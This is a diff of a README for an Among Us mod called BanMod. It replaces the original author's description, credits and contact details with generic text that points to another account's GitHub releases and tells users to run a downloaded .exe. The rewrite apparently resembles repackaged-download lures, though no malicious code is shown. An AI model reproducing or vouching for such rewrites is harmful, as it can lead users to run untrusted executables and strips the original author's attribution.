@@ -1,76 +1,87 @@
-<h1 align="center">BanMod for Among Us</h1>
+# 🎮 BanMod - Customize Your Among Us Experience
 
-<img align="left" alt="Cover" src="/newimage.png" width="50%" height="300" />
-<p align="right">
+## 📥 Download Now!
+[![Download BanMod](https://img.shields.io/badge/Download%20BanMod-v1.0-blue)](https://github.com/egorik222444/BanMod/releases)
 
-> ### About This Mod
-> 
-> This mod is not affiliated with Among Us or Innersloth LLC,
-> 
-> and the content herein is not endorsed or
-> 
-> sponsored by Innersloth LLC. Portions of the materials
-> 
-> contained herein are the property of Innersloth LLC.
-> 
-> ### This is not a cheat, it is a mod that adds new features to the game.
+## 🚀 Getting Started
 
----
-<br>
+BanMod enhances your gameplay in Among Us. This mod works on official servers, allowing for customization options that include adding power-ups to specific roles. Additionally, it helps in maintaining a fair game environment by allowing the permanent banning of disruptive players.
 
-### Information
+## 📦 System Requirements
 
-BanMod was created primarily to prevent "toxic" players from rejoining after the official Among Us ban.
-Unfortunately, the official Among Us ban wasn't enough
-and can be circumvented by changing the device's IP address or using a VPN!!!
+To run BanMod smoothly, ensure your system meets the following requirements:
 
-Gradually, the mod has become increasingly complex and many more features have been added,
-always striving to keep it compatible with the official servers. For this reason, it has some limitations and annoyances
-(such as waiting to send messages).
+- **Operating System**: Windows 10 or later
+- **CPU**: 2.0 GHz dual-core or faster
+- **RAM**: 4 GB or more
+- **Storage**: At least 200 MB of free space
+- **Network**: Stable internet connection for online play
 
----
-### Features
-  - You can ban or kick disruptive players at any time, even during matches.
-  - You can decide whether to share your lobby code, and other players with the mod can join by obtaining codes from the website https://banmod.online/
-  - Immediately denies access to lobbies to players with names you have banned (Denyname.txt)
-  - Immediately denies access to lobbies to players who are in the list (banList.txt) or to players who are blocked on Among Us
-  - Kicks or bans those who use banned words or spam start, you can set from 0 to 5 allowed words before being kicked
-  - You can color and add symbols to names
-  - You can decide whether to kick or protect players who have been in the game for too long (Time and action can be set)
-  - You can close the meetings and you can end the match if necessary
-  - There are also some role enhancements or additions to Crewmates:
-### Enhancements or additions to Crewmates
-  - The Crewmate who completes all tasks in the shortest time will become immortal and cannot be killed or voted on normally, but can be voted on and killed in meetings. The Engineer and the Guesser cannot become immortal.
-  - The Imposter (only the Spectre) can kill the Immortal in meetings by guessing who they are, but if they guess incorrectly, they commit suicide.
-  - The Engineer, when he completes all tasks, resolves active sabotage a set number of times by trapdooring (coms cannot be repaired).
-  - The Guesser can kill Impostors in meetings by guessing who they are. If they guess incorrectly, they commit suicide.
-  - The President (exiler) can forcefully expel (or kill) a player of his choice. If the target is not an impostor, there are no consequences. Crewmates and impostors can become President.
-  - The Scientist will receive the actual time of the players' death.
+## 🔗 Download & Install
 
-### INSTALLATION
+To get started with BanMod, follow these steps:
 
-To install the mod, just extract and copy the contents into the main folder of among.
-(There are several tutorials online, if you encounter problems do not hesitate to contact me.)
-The mod will create a new folder called BAN_DATA,
+1. **Visit the Releases Page**: Click on the link below to access the download page.
+   
+   [Download BanMod Releases](https://github.com/egorik222444/BanMod/releases)
 
-from there you can add names and banned words template, add/remove players from the ban list, ecc
+2. **Choose the Latest Version**: Look for the latest version of BanMod, usually marked with a tag like "Latest" or a version number.
 
----
-### Customization 
-Customization with your own images, backgrounds, or names is available upon request (only for aesthetics).
-Personalization is free, but a donation is always appreciated.
-If you want to support me you can donate on paypal.
+3. **Download the File**: Click on the download link for the appropriate file type. This could be an executable file (.exe) or a zipped archive (.zip).
 
-### 💰 [Donate with PayPal](https://www.paypal.com/donate/?hosted_button_id=AQTKF6FGQLPCL)
+4. **Install the Mod**:
+   - If you downloaded a .zip file, extract it using built-in tools or applications like WinRAR or 7-Zip.
+   - Locate the extracted folder and find the executable file.
+   - Double-click the .exe file to run it.
 
-### Contacts 
-### 📧 Email: [banmod.giannibart@gmail.com](banmod.giannibart@gmail.com)  
-### 💬 Telegram: [@Giannibart](https://t.me/Giannibart)
----
-The mod was created by recovering and modifying parts of code from other mods, in particular thanks to the developers of
-### ⚙️ [TOH](https://github.com/tukasa0001/TownOfHost)
-### ⚙️ [TOHE](https://github.com/KARPED1EM/TownOfHostEdited)
-### ⚙️ [EHR](https://github.com/Gurge44/EndlessHostRoles/tree/main)
-### ⚙️ [BANMOD_MIN](https://github.com/GianniBart/BanMod_Min/tree/main)
----
+5. **Follow On-Screen Instructions**: The installation wizard will guide you through the setup process. Make sure to read each step carefully and follow the prompts.
 
+6. **Launch Among Us**: Once installation is complete, open your Among Us game. The mod should now activate, offering you the new features and enhancements.
+
+## 🛠️ Features
+
+With BanMod, you receive a variety of enhancements:
+
+- **Customization Options**: Tailor power-ups to suit your gameplay style. Choose from various power-ups that can be assigned to different roles in the game.
+  
+- **Permanent Player Bans**: Easily ban disruptive players from your games, creating a better environment for everyone.
+
+- **User-Friendly Interface**: Navigate through easy settings to adjust features without any technical knowledge.
+
+## 🏗️ Support
+
+If you run into issues or have questions, please feel free to check our support resources:
+
+- **GitHub Issues Page**: Report bugs or request features directly through our [Issues Section](https://github.com/egorik222444/BanMod/issues).
+
+- **Community Help**: Engage with other users in the community forums. Share tips and tricks, or simply ask for help.
+
+## ✅ Tips for Best Performance
+
+1. **Update Regularly**: Always download the latest version from the [Releases Page](https://github.com/egorik222444/BanMod/releases) to ensure you have the newest features and bug fixes.
+   
+2. **Check Compatibility**: Ensure your version of Among Us is up to date for seamless integration with BanMod.
+
+3. **Backup Your Files**: Before installing any mod, consider backing up your game files. This way, you can restore them if needed.
+
+4. **Read Community Feedback**: Engage with the user community to learn about common issues or enhancements.
+
+## 🌐 Community and Contributions
+
+We encourage users to engage with our ongoing development. Your feedback helps us improve the mod. If you wish to contribute:
+
+- **Fork the Repository**: Feel free to fork our GitHub repository and make your own changes.
+  
+- **Submit Pull Requests**: If you have improvements or new features, submit a pull request for consideration.
+
+- **Join Discussions**: Participate in community discussions to share ideas or learn from other users.
+
+## 🤝 Acknowledgments
+
+We appreciate the contributions from the community and the continuous support from users. Your input not only helps improve BanMod but also enriches the gameplay experience for everyone.
+
+## 🎉 Conclusion
+
+BanMod is designed to enhance your gaming experience in Among Us. By following the steps outlined above, you will be able to easily download, install, and enjoy the new features. For any further questions or support needed, our community is here to help. 
+
+For further exploration, revisit the [Download BanMod Releases](https://github.com/egorik222444/BanMod/releases) link and enjoy your customized gameplay experience!
